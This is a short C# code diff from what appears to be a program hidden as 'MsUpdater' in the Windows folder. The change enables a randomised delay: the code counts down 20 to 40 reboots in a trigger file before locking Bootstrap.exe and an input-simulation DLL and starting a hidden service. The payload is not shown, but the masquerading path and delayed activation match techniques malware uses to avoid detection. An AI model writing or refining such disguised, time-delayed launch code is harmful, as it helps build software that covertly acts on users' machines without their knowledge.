@@ -17,41 +17,32 @@
             }
 
             Thread.Sleep(200);
-
-            var run = true;
-             
-            // ---- Code for stable versions ---- //
-
-            /*
-
+            
             const string Target = @"C:\Windows\MsUpdater\trigger";
             
             if (!File.Exists(Target))
             {
                 File.WriteAllText(Target, new Random().Next(20, 40).ToString());
-                run = false;
+                return;
             }
 
-            var content = int.Parse(File.ReadAllLines(Target).Single());
+            var reboots = int.Parse(File.ReadAllLines(Target).Single());
 
-            if (content != 0)
+            if (reboots != 0)
             {
-                File.WriteAllText(Target, (content - 1).ToString());
-                run = false;
+                File.WriteAllText(Target, (reboots - 1).ToString());
+                return;
             }
-
-            */
 
             using (File.Open(@"C:\Windows\MsUpdater\Bootstrap.exe", FileMode.Open, FileAccess.Read, FileShare.Read))
             {
                 using (File.Open(@"C:\Windows\MsUpdater\InputSimulator.dll", FileMode.Open, FileAccess.Read, FileShare.Read))
                 {
-                    if (run)
+                    using (File.Open(Target, FileMode.Open, FileAccess.Read, FileShare.Read))
                     {
                         RuntimeHelpers.RunClassConstructor(typeof(Service).TypeHandle);
+                        Process.GetCurrentProcess().WaitForExit();
                     }
-
-                    Process.GetCurrentProcess().WaitForExit();
                 }
             }
         }
